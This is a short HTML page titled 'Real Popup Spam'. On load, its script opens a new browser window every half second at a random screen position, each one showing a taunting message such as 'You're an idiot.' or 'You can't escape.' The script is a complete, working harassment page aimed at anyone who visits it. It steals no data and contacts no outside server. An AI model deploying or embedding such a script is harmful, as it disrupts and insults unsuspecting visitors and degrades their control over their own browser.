<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Real Popup Spam</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: black;
    }
  </style>
</head>
<body>

<script>
  const messages = [
    "You're an idiot.",
    "Still here?",
    "You can't escape.",
    "Seriously, stop.",
    "Why are you clicking?",
    "Ok fine, I'll stop...",
    "Just kidding.",
    "Keep clicking...",
    "You're persistent.",
    "I'm running out of things to say."
  ];

  let msgIndex = 0;

  function openPopup() {
    const message = messages[msgIndex];
    const newWindow = window.open("", "", "width=300,height=200,top=" + Math.random() * screen.height + ",left=" + Math.random() * screen.width);
    if (newWindow) {
      newWindow.document.write(`<body style="background:black;color:white;display:flex;align-items:center;justify-content:center;font-size:20px;">${message}</body>`);
    }
    msgIndex = (msgIndex + 1) % messages.length;
  }

  // Start spamming immediately on load
  window.onload = function() {
    setInterval(openPopup, 500); // open a popup every 500ms
  };
</script>

</body>
</html>
